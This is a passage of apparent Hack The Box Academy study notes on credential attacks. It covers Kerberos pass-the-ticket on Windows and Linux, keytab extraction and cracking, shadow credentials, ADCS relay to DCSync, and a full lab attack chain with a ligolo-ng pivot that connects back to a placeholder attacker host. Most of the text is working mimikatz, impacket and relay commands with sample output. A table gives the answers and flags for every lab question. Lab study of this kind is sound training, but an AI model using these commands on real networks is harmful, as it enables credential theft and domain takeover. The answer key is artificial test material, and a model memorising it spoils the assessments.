C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# Exports .kirbi files to current directory named like:
# [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi  ← machine TGT (MS01$)
# [0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi ← user TGT (john)
# [0;45828]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi ← user TGT (julio)

# Count user TGTs (Group 2 = TGT, Group 0/1 = TGS/service tickets)
# User TGTs: john, julio, david (3 in the module example)
dir *.kirbi
```

**Ticket filename anatomy:** `[LUID]-Group-N-Flags-Username@ServiceClass-REALM.kirbi`
- Group 2 = Ticket Granting Ticket (TGT) — this is what you want
- Group 0/1 = Ticket Granting Service tickets (TGS) — service-specific

### PA.19.2. Pass the Ticket (import a TGT)

```cmd
# Interactive mimikatz session
C:\tools\mimikatz.exe

mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
# → * File: '...': OK

# Verify the ticket is loaded
mimikatz # klist

mimikatz # exit
```

After PtT, the current session authenticates as john via Kerberos. Access resources:
```cmd
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt
```

### PA.19.3. PtT + PowerShell Remoting

After loading a ticket in the same cmd process, you can start PowerShell and use the ticket for PSRemoting:

```cmd
# From the same cmd where you did kerberos::ptt
powershell
Enter-PSSession -ComputerName DC01

[DC01]: PS C:\Users\john\Documents> cat C:\john\john.txt
```

> 🔍 Worth remembering generally: `kerberos::ptt` loads the ticket into the current process's Kerberos credential cache. Any child process (including `powershell` spawned from that cmd) inherits the ticket. `Enter-PSSession` then uses Kerberos authentication automatically when a valid TGT is cached.

> 🔁 Similar to: [[Password Attacks#16.3.2. Passing NTLM|16.3.2 PtH]] uses NTLM hashes for lateral movement. PtT uses Kerberos tickets instead — same goal, different protocol. Kerberos PtT is required when NTLMv1/v2 is disabled on the network.

#### Tags: #PassTheTicket #PtT #Kerberos #TGT #kirbi #mimikatz #sekurlsatickets #kerberosPtt #PSRemoting

---

## PA.20. Pass the Ticket (PtT) from Linux

Linux systems joined to an Active Directory domain (via realmd + sssd) store Kerberos tickets as ccache files in `/tmp/`. These can be stolen and used on Kali or another Linux host.

### PA.20.1. Enumerate Domain Context

```bash
# Check realm membership and which groups can log in
realm list
# Output shows: permitted-groups, login-formats, domain-name
```

### PA.20.2. Find and Use Kerberos Tickets (ccache files)

```bash
# Find ccache files owned by domain users
ls -la /tmp/ | grep krb5
# → krb5cc_647401106_9JBodG (owned by julio@inlanefreight.htb)
# → krb5cc_647401109_JKXJ8V (owned by svc_workstations@inlanefreight.htb)

# Steal a ticket (requires root or same user)
cp /tmp/krb5cc_647401106_9JBodG /root/

# Set the environment variable so tools use this ticket
export KRB5CCNAME=/root/krb5cc_647401106_9JBodG

# Verify the ticket
klist
# → Default principal: julio@INLANEFREIGHT.LOCAL

# Use the ticket to access an SMB share as julio (no password needed)
smbclient //dc01/julio -k -c 'get julio.txt' -no-pass
cat julio.txt
```

### PA.20.3. Find Keytab Files

Keytabs store Kerberos long-term keys (equivalent to hashed passwords) for service accounts. Often left on Linux machines for automated scripts:

```bash
# Find all keytab files
find / -name *keytab* -ls 2>/dev/null

# Look for files with -rw-rw-rw- (world-writable) or accessible to your current user
# → /opt/specialfiles/carlos.keytab (rw-rw-rw- in the lab)
```

### PA.20.4. Extract Hashes from Keytab

```bash
# Extract Kerberos hashes from a keytab file
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
# Output: NTLM HASH, AES-256 HASH, AES-128 HASH

# Crack the NTLM hash (or look up on crackstation.net for simple passwords)
hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
# → Password5
```

### PA.20.5. Check Crontab for Keytab References

```bash
# Crontabs often reference keytab files used for scheduled Kerberos scripts
crontab -l
# → */5 * * * * /home/carlos/.scripts/kerberos_script_test.sh

ls -la /home/carlos@inlanefreight.htb/.scripts/
# → svc_workstations._all.kt (another keytab)
# → john.keytab

python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
# → NTLM HASH for svc_workstations → crack → Password4
```

### PA.20.6. kinit with Machine Keytab

The machine account's keytab at `/etc/krb5.keytab` allows authenticating as the machine itself (`LINUX01$`), which gives access to machine account permissions:

```bash
# Authenticate as the machine account using the machine's keytab
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab

# Access a share that the machine account has permissions to
smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
```

### PA.20.7. SSH with Domain Authentication

```bash
# Format for SSH with domain account: user@domain@target
ssh david@inlanefreight.htb@TARGET_IP -p 2222
# Password: Password2
```

> 🔧 Technique: the `KRB5CCNAME` environment variable only affects the current shell session. If you open a new terminal, you'll need to export it again. For Impacket tools, you can also pass the ccache directly via the `-k` flag and `-no-pass`.

> 🔁 Similar to: PtT from Windows (PA.19) uses mimikatz + kirbi files. The Linux equivalent uses `export KRB5CCNAME` + ccache files. Same concept, different file format and tooling.

#### Tags: #PassTheTicket #Linux #ccache #KRB5CCNAME #keytab #keytabextract #kinit #smbclientKerberos #realm

---

## PA.21. Pass the Certificate (PtC) / Shadow Credentials

**Shadow Credentials** abuse the `msDS-KeyCredentialLink` attribute in Active Directory. By adding a certificate-based credential to a target account, you can request a TGT using PKINIT (certificate-based Kerberos auth) without knowing the account's password. Requires write access to the target account's AD object.

### PA.21.1. pywhisker — Add Certificate Credential to Target Account

```bash
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker

# Set up virtual environment with specific cryptography version
python3 -m venv venv && source venv/bin/activate
pip install cryptography==36.0.0
pip install rich impacket ldap3 ldapdomaindump dsinternals pyasn1

# Add a shadow credential to the target account (requires write access to target)
python3 pywhisker.py --dc-ip DC_IP -d DOMAIN.LOCAL -u user -p 'password' \
  --target jpinkman --action add
# Output:
# [+] PFX certificate saved to: 1UCYb0YS.pfx
# [i] Password for PFX: 1P9EvC2tKKJlBSum4Ej4
```

### PA.21.2. PKINITtools — Request TGT via Certificate

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt

# Fix common "Error detecting the version of libcrypto" error:
pip3 install -I git+https://github.com/wbond/oscrypto.git

# Request a TGT using the certificate (PKINIT)
python3 gettgtpkinit.py \
  -cert-pfx ../pywhisker/pywhisker/1UCYb0YS.pfx \
  -pfx-pass '1P9EvC2tKKJlBSum4Ej4' \
  -dc-ip DC_IP \
  DOMAIN.LOCAL/jpinkman /tmp/jpinkman.ccache
# → AS-REP encryption key: bf43d22231...
# → Saved TGT to file

# Configure Kerberos and /etc/hosts
echo "DC_IP   dc01.domain.local" | sudo tee -a /etc/hosts
# Edit /etc/krb5.conf to add the realm pointing to the DC

# Use the ticket
export KRB5CCNAME=/tmp/jpinkman.ccache
klist    # verify ticket is loaded

# Authenticate via evil-winrm using the Kerberos ticket (no password/hash)
evil-winrm -i dc01.domain.local -r domain.local
```

### PA.21.3. ADCS Relay — Coerce DC Authentication to Get Machine Certificate

When you don't have write access to a user's AD object but can perform NTLM coercion, relay the DC's machine account credentials to ADCS to get a machine certificate, then use it to DCSync:

```bash
# Step 1: start ntlmrelayx targeting the ADCS web enrollment endpoint
sudo impacket-ntlmrelayx \
  -t http://CASERVER_IP/certsrv/certfnsh.asp \
  --adcs -smb2support \
  --template KerberosAuthentication
# Listens on port 445 for incoming NTLM auth, relays to ADCS

# Step 2: coerce DC to authenticate to Kali (triggers the relay)
wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py
python3 printerbug.py DOMAIN/user:pass@DC_IP KALI_IP
# ntlmrelayx catches the DC's machine account auth and relays it to ADCS
# → [+] GOT CERTIFICATE! → DC01$.pfx written

# Step 3: get TGT for the machine account using the certificate
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip DC_IP \
  'domain.local/dc01$' /tmp/dc.ccache

export KRB5CCNAME=/tmp/dc.ccache

# Step 4: DCSync as the machine account (machine accounts on DCs can replicate)
impacket-secretsdump -k -no-pass -dc-ip DC_IP \
  -just-dc-user Administrator \
  'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL
# → Administrator:500:aad3...:fd02e525dd676fd8ca04e200d265f20c:::

# Step 5: PtH with the Administrator hash
evil-winrm -i dc01.domain.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

> 🔍 Worth remembering generally: the ADCS relay attack (ESC8) requires: (1) an ADCS server with Web Enrollment enabled, (2) the ability to coerce NTLM authentication from a DC (via PrinterBug, PetitPotam, or similar), and (3) an unprotected ADCS enrollment endpoint (no EPA/Extended Protection). This is an extremely high-value attack on AD environments — machine account + DCSync = full domain compromise in one chain.

> 🔧 Technique: the `oscrypto` libcrypto fix (`pip3 install -I git+https://github.com/wbond/oscrypto.git`) is almost always needed when running `gettgtpkinit.py`. Save this command in your notes — the "Error detecting the version of libcrypto" error is a guaranteed stumbling block.

> 🔁 Similar to: [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 NTLM relay]] relays NTLM to SMB for command execution. This relays NTLM to ADCS HTTP for certificate issuance — same relay infrastructure, different target service.

#### Tags: #PassTheCertificate #ShadowCredentials #pywhisker #PKINITtools #PKINIT #ADCS #ESC8 #ntlmrelayx #printerbug #DCSync #machineAccount

---

## PA.22. Skills Assessment Chain (Full Attack Path)

The skills assessment combines: foothold via username-anarchy + hydra, credential discovery in bash_history, ligolo-ng pivot, share hunting with Snaffler, Password Safe v3 cracking, PtH for lateral movement, LSASS dumping, and NTDS dump for DA hash.

**Summary of the chain:**
```
SSH only on DMZ01 → username-anarchy (Betty Jayde) → hydra SSH → jbetty:Texas123!@#
→ bash_history grep finds: sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
→ ligolo-ng pivot to 172.16.119.0/24 internal network
→ nxc rdp hosts → hwilliam:dealer-screwed-gym1 is local admin on JUMP01
→ RDP as hwilliam + Snaffler → HR share → Employee-Passwords_OLD.psafe3
→ hashcat -m 5200 psafe3 rockyou.txt → michaeljackson
→ Password Safe 3 → bdavid:caramel-cigars-reply1 + stom:fails-nibble-disturb4
→ nxc winrm → bdavid is local admin on JUMP01
→ RDP as bdavid + mimikatz sekurlsa::logonpasswords → stom NTLM hash: 21ea958524cfd9a7791737f8d2f764fa
→ nxc smb hosts -H stom_hash → stom is Pwn3d! on FILE01 and DC01
→ nxc smb DC01 -u stom -H hash --ntds --user Administrator → 36e09e1e6ade94d63fbcab5e5b8d6d23
```

**ligolo-ng pivot (new to this session):**
```bash
# On Kali: download both agent and proxy
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_aali64.tar.gz

# Start the proxy on Kali
sudo ./proxy -selfcert
# → Listening on 0.0.0.0:11601

# Transfer agent to pivot host, run it
python3 -m http.server 8000   # on Kali
wget http://KALI_IP:8000/agent   # on pivot
chmod +x ./agent && ./agent -connect KALI_IP:11601 --ignore-cert

# Back in the ligolo-ng proxy console:
ligolo-ng » session          # select the DMZ01 session
[Agent: jbetty@DMZ01] » autoroute   # select internal subnet, create interface, start tunnel
```

After autoroute, all internal IPs (172.16.119.x) are routable from Kali.

> 🔁 Similar to: [[Port Redirection and SSH Tunneling]] covers ligolo-ng as a modern tunneling alternative (Module 19).

---

## PA.23. All Section Q&A Answers

| Section | Q | Answer |
|---|---|---|
| Intro to Password Cracking | SHA1 of Academy#2025? | **750fe4b402dc9f91cedf09b652543cd85406be8c** |
| Intro to John the Ripper | r0lf's password (single-crack)? | **NAITSABES** |
| Intro to John the Ripper | RIPEMD-128 hash (rockyou)? | **50cent** |
| Intro to Hashcat | MD5 dictionary crack? | **crazy!** |
| Intro to Hashcat | MD5 dictionary+rules crack? | **c0wb0ys1** |
| Intro to Hashcat | MD5 mask attack `?u?l?l?l?l?d?s`? | **Mouse5!** |
| Custom Wordlists and Rules | Mark's password? | **Baseball1998!** |
| Cracking Protected Files | Confidential.xlsx password? | **beethoven** |
| Cracking Protected Archives | VHD BitLocker password? | **francisco** |
| Cracking Protected Archives | flag.txt in mounted BitLocker VHD? | **43d95aeed3114a53ac66f01265f9b7af** |
| Network Services | WinRM user (john) flag? | **HTB{That5Novemb3r}** |
| Network Services | SSH user (dennis) flag? | **HTB{Let5R0ck1t}** |
| Network Services | RDP user (chris) flag? | **HTB{R3m0t3DeskIsw4yT00easy}** |
| Network Services | SMB user (cassie) flag? | **HTB{S4ndM4ndB33}** |
| Spraying/Stuffing/Defaults | MySQL default credentials? | **superdba:admin** |
| Attacking SAM | SAM registry location? | **hklm\sam** |
| Attacking SAM | ITbackdoor plaintext password? | **matrix** |
| Attacking SAM | LSA secret credentials? | **frontdesk:Password123** |
| Attacking LSASS | LSASS executable name? | **lsass.exe** |
| Attacking LSASS | Vendor account password? | **Mic@123** |
| Attacking Windows Credential Manager | mcharles OneDrive password? | **Inlanefreight#2025** |
| Attacking AD and NTDS.dit | File with domain password hashes? | **ntds.dit** |
| Attacking AD and NTDS.dit | Administrator NT hash (from section example)? | **64f12cddaa88057e06a81b54e73b949b** |
| Attacking AD and NTDS.dit | John Marston's credentials? | **jmarston:P@ssword!** |
| Attacking AD and NTDS.dit | Jennifer Stapleton's password? | **Winter2008** |
| Credential Hunting in Windows | Bob's SSH password for switches? | **WellConnected123** |
| Credential Hunting in Windows | Bob's GitLab access code? | **3z1ePfGbjWPsTfCsZfjy** |
| Credential Hunting in Windows | Bob's WinSCP credentials? | **ubuntu:FSadmin123** |
| Credential Hunting in Windows | Default new domain user password? | **Inlanefreightisgreat2022** |
| Credential Hunting in Windows | Edge-Router credentials? | **edgeadmin:Edge@dmin123!** |
| Linux Auth Process | martin's password (single-crack)? | **Martin1** |
| Linux Auth Process | sarah's password (rockyou)? | **mariposa** |
| Credential Hunting in Linux | Will's Firefox-saved password? | **TUqr7QfLTLhruhVbCP** |
| Network Traffic Q1 | Cleartext credit card number? | **5156 8829 4478 9834** |
| Network Traffic Q2 | SNMPv2 community string? | **s3cr3tSNMPC0mmun1ty** |
| Network Traffic Q3 | FTP user password? | **qwerty123** |
| Network Traffic Q4 | File downloaded over FTP? | **creds.txt** |
| Credential Hunting in Shares Q1 | Password in IT share file? | **ILovePower333###** |
| Credential Hunting in Shares Q2 | Domain admin password in HR share? | **Str0ng_Adm1nistrat0r_P@ssword_2025!** |
| Pass the Hash Q1 | Flag at C:\pth.txt? | **G3t_4CCE$$_V1@_PTH** |
| Pass the Hash Q2 | Registry value for PtH RDP? | **DisableRestrictedAdmin** |
| Pass the Hash Q3 | David's NTLM hash (mimikatz)? | **c39f2beb3d2ec06a62cb887fb391dee0** |
| Pass the Hash Q4 | Flag at \\DC01\david\david.txt? | **D3V1d_Fl5g_is_Her3** |
| Pass the Hash Q5 | Flag at \\DC01\julio\julio.txt (mimikatz pth)? | **JuL1()_SH@re_fl@g** |
| Pass the Hash Q6 | Flag at C:\julio\flag.txt (Invoke-WMIExec)? | **JuL1()_N3w_fl@g** |
| PtT from Windows Q1 | Number of user TGTs? | **3** |
| PtT from Windows Q2 | Flag at \\DC01\john\john.txt (PtT)? | **Learn1ng_M0r3_Tr1cks_with_J0hn** |
| PtT from Windows Q3 | Flag at C:\john\john.txt (PSRemoting)? | **P4$$_th3_Tick3T_PSR** |
| PtT from Linux Q1 | Flag in David's home directory? | **Gett1ng_Acc3$$_to_LINUX01** |
| PtT from Linux Q2 | Group that can connect to LINUX01? | **Linux Admins** |
| PtT from Linux Q3 | World-writable keytab filename? | **carlos.keytab** |
| PtT from Linux Q4 | Flag in carlos's home (keytab crack)? | **C@rl0s_1$_H3r3** |
| PtT from Linux Q5 | Flag in svc_workstations home? | **Mor3_4cce$$_m0r3_Pr1v$** |
| PtT from Linux Q6 | Flag at /root/flag.txt (sudo su)? | **Ro0t_Pwn_K3yT4b** |
| PtT from Linux Q7 | julio.txt from ccache PtT? | **JuL1()_SH@re_fl@g** |
| PtT from Linux Q8 | flag.txt via LINUX01$ keytab? | **Us1nG_KeyTab_Like_@_PRO** |
| Pass the Certificate Q1 | jpinkman Desktop flag.txt? | **3d7e3dfb56b200ef715cfc300f07f3f8** |
| Pass the Certificate Q2 | Administrator Desktop flag.txt (ADCS relay)? | **a1fc497a8433f5a1b4c18274019a2cdb** |
| Skills Assessment | NTLM hash of NEXURA\Administrator? | **36e09e1e6ade94d63fbcab5e5b8d6d23** |

---

## Outstanding Sections

- [x] PA.1 Hash computation (sha1sum, -n flag)
- [x] PA.2 John the Ripper deep dive (single-crack, unshadow, office2john, bitlocker2john)
- [x] PA.3 Hashcat additional modes (mask attack, custom wordlist gen, psafe3, --show)
- [x] PA.4 BitLocker VHD full crack + mount chain (losetup, dislocker)
- [x] PA.5 MSF smb_login auxiliary
- [x] PA.6 Default credentials tool (defaultcreds-cheat-sheet)
- [x] PA.7 SAM offline dump (reg.exe save + smbserver + secretsdump LOCAL)
- [x] PA.8 LSASS dump via Task Manager + pypykatz
- [x] PA.9 Remote credential dumping (nxc --lsa, --ntds, --sam)
- [x] PA.10 Windows Credential Manager (cmdkey, runas /savecred, LaZagne)
- [x] PA.11 Credential hunting in Windows files (findstr, Get-ChildItem, script hunting)
- [x] PA.12 NTDS.dit via VSS (vssadmin + copy)
- [x] PA.13 username-anarchy for username generation
- [x] PA.14 kerbrute (userenum + bruteuser)
- [x] PA.15 Firefox credential extraction (firefox_decrypt.py)
- [x] PA.16 Network traffic analysis (Wireshark: http, snmp, ftp filters)
- [x] PA.17 Credential hunting in shares (smbclient, nxc spider, Get-ChildItem UNC, Snaffler)
- [x] PA.18 Pass the Hash deep dive (nxc -x, xfreerdp /pth:, DisableRestrictedAdmin, mimikatz pth, Invoke-WMIExec)
- [x] PA.19 Pass the Ticket from Windows (sekurlsa::tickets, kerberos::ptt, Enter-PSSession)
- [x] PA.20 Pass the Ticket from Linux (ccache, keytabextract, kinit, smbclient -k)
- [x] PA.21 Pass the Certificate (pywhisker, gettgtpkinit.py, ADCS relay/ESC8, printerbug, DCSync)
- [x] PA.22 Skills assessment chain + ligolo-ng pivot
- [x] PA.23 All 53 Q&A answers
- All labs are HTB spawnable targets — no Offsec VM required for this note

---

## Related Boxes

- **[Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)** (HTB, Windows, Easy): EternalBlue → PtH chain. Practical application of PA.18 hash-based lateral movement.
- **[Forest](https://0xdf.gitlab.io/2020/03/21/htb-forest.html)** (HTB, Windows, Medium): AS-REP Roasting → Kerberos TGT → DCSync. Adjacent to PA.19-PA.21 Kerberos attack chain.
- **[Active](https://0xdf.gitlab.io/2018/12/08/htb-active.html)** (HTB, Windows, Easy): GPP password → Kerberoasting → DA. Kerberos ticket abuse, PA.19 territory.
- **[Cascade](https://www.hackthebox.com/machines/cascade)** (HTB, Windows, Medium): Active Directory credential hunting, LDAP, Kerberos. Heavy credential chaining like PA.10-PA.12.
- **[Bastion](https://www.hackthebox.com/machines/bastion)** (HTB, Windows, Easy): VHD mount → SAM offline extraction → user credentials. Direct parallel to PA.4 and PA.7.
